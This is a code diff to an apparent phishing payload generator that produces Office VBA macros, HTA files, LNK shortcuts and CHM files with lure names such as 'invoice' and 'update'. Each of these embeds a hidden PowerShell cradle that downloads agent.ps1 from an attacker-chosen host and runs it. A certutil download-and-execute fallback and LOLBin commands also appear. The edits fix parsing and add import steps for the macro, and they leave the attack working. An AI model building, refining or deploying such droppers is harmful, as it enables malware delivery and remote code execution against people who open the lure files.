@@ -30,12 +30,8 @@ Usage:
 """
 
 import argparse
-import os
-import sys
 import base64
-import random
-import string
-import datetime
+from datetime import datetime
 from pathlib import Path
 
 GREEN = "\033[92m"; RED = "\033[91m"; YELLOW = "\033[93m"
@@ -44,10 +40,15 @@ CYAN = "\033[96m"; BOLD = "\033[1m"; RESET = "\033[0m"
 OUTPUT_DIR = Path("payloads")
 
 def generate_macro(server, name=None):
-    """Generate Office VBA macro with encrypted payload."""
-    out = OUTPUT_DIR / (name or f"document_{datetime.now():%Y%m%d}.docm")
+    """Emit the VBA macro as an importable .bas module (honest output).
 
-    host, _, port = server.rsplit(":", 1) if ":" in server else (server, "", "8443")
+    A real .docm is an OOXML (zip) document; writing plain VBA text with a
+    .docm extension produces a file Word cannot open. We emit the macro source
+    as a .bas module for manual import instead of faking the container.
+    """
+    out = OUTPUT_DIR / (name or f"document_{datetime.now():%Y%m%d}.bas")
+
+    host, port = server.rsplit(":", 1) if ":" in server else (server, "8443")
 
     # Encrypted PowerShell download cradle
     ps_command = f"""powershell -w hidden -nop -c "$c=New-Object Net.WebClient;$c.DownloadString('http://{host}:{port}/agent.ps1')|IEX" """
@@ -110,16 +111,18 @@ End Sub
 
     out.write_text(vba)
     size = out.stat().st_size
-    print(f"{GREEN}[✓]{RESET} Macro: {out.name} ({size} B)")
+    print(f"{GREEN}[✓]{RESET} VBA module: {out.name} ({size} B)")
+    print(f"  {YELLOW}Honesty note:{RESET} this is VBA source, not a .docm container")
+    print(f"  {YELLOW}Import:{RESET} Word → Alt+F11 → File > Import File… → select {out.name}")
+    print(f"  {YELLOW}Then:{RESET} save the document as .docm (macro-enabled) yourself")
     print(f"  {YELLOW}Execution:{RESET} Open document → Enable macros → Auto-executes")
-    print(f"  {YELLOW}Evasion:{RESET} Sandbox check, VM check, delayed execution, encoded command")
     return out
 
 def generate_hta(server, name=None):
     """Generate HTA application."""
     out = OUTPUT_DIR / (name or f"update_{datetime.now():%Y%m%d}.hta")
 
-    host, _, port = server.rsplit(":", 1) if ":" in server else (server, "", "8443")
+    host, port = server.rsplit(":", 1) if ":" in server else (server, "8443")
 
     hta = f"""<html>
 <head>
@@ -146,7 +149,7 @@ Sub Window_OnLoad
     Set shell = CreateObject("WScript.Shell")
 
     ' Method 1: PowerShell download
-    shell.Run "powershell -w hidden -nop -c ""$c=New-Object Net.WebClient;$c.DownloadString('http://{host}:{port}/agent.ps1')|IEX""", 0, False
+    shell.Run "powershell -w hidden -nop -c ""$c=New-Object Net.WebClient;$c.DownloadString('http://{host}:{port}/agent.ps1')|IEX\""", 0, False
 
     ' Method 2: certutil (fallback)
     ' shell.Run "cmd /c certutil -urlcache -split -f http://{host}:{port}/agent.exe %TEMP%\\update.exe && start %TEMP%\\update.exe", 0, False
@@ -173,7 +176,7 @@ def generate_lnk(server, name=None):
     """Generate LNK shortcut with hidden PowerShell execution."""
     out = OUTPUT_DIR / (name or f"invoice_{datetime.now():%Y%m%d}.lnk")
 
-    host, _, port = server.rsplit(":", 1) if ":" in server else (server, "", "8443")
+    host, port = server.rsplit(":", 1) if ":" in server else (server, "8443")
 
     # PowerShell command with multiple evasion layers
     ps_cmd = f"powershell -w hidden -nop -ep bypass -c \"$c=New-Object Net.WebClient;$c.DownloadString('http://{host}:{port}/agent.ps1')|IEX\""
@@ -203,7 +206,7 @@ def generate_chm(server, name=None):
     """Generate CHM with auto-executing JavaScript."""
     out = OUTPUT_DIR / (name or f"help_{datetime.now():%Y%m%d}.chm")
 
-    host, _, port = server.rsplit(":", 1) if ":" in server else (server, "", "8443")
+    host, port = server.rsplit(":", 1) if ":" in server else (server, "8443")
 
     # Create HHP project file
     hhp = f"""[OPTIONS]
@@ -286,7 +289,7 @@ function init() {{
 
 def generate_lolbins(server):
     """Generate all LOLBin execution commands."""
-    host, _, port = server.rsplit(":", 1) if ":" in server else (server, "", "8443")
+    host, port = server.rsplit(":", 1) if ":" in server else (server, "8443")
 
     payloads = {
         "mshta": f"""# mshta.exe - Execute HTA remotely
